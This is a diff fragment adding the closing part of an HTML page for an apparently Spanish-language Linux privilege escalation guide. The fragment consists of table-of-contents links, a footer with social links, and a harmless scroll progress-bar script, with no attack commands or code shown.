+        <li class="toc-sub"><a href="#cap-es">3.3 Capabilities</a></li>
+        <li class="toc-sub"><a href="#cron-es">3.4 Cron jobs</a></li>
+        <li class="toc-sub"><a href="#path-es">3.5 PATH hijacking</a></li>
+        <li class="toc-sub"><a href="#creds-es">3.6 Credenciales</a></li>
+        <li class="toc-sub"><a href="#kernel-es">3.7 Kernel exploits</a></li>
+        <li><a href="#fase4-es">Fase 4: Estabilizar</a></li>
+        <li><a href="#checklist-es">Checklist</a></li>
+      </ul>
+    </aside>
+  </div>
+
+</div>
+
+<footer>
+  <div class="wrapper">
+    <div class="footer-logo">THE<em>//</em>VAULT</div>
+    <ul class="footer-links">
+      <li><a href="https://github.com/ST3G4N05" target="_blank">GitHub</a></li>
+      <li><a href="https://www.linkedin.com/in/jordi-mr/">LinkedIn</a></li>
+    </ul>
+    <p class="footer-copy">© 2025 MUNCHK1N // ST3G4N05 — A VAULT OF DEF/OFFENSIVE KNOWLEDGE</p>
+  </div>
+</footer>
+</div>
+
+<script src="../../js/vault.js"></script>
+<script src="../../js/i18n.js"></script>
+<script>
+  window.addEventListener('scroll', () => {
+    const el = document.getElementById('post-content');
+    const bar = document.getElementById('progress');
+    if (!el || !bar) return;
+    const total = el.offsetHeight - window.innerHeight;
+    const scrolled = Math.max(0, -el.getBoundingClientRect().top);
+    bar.style.width = Math.min(100, (scrolled / total) * 100) + '%';
+  });
+</script>
+</body>
+</html>
+
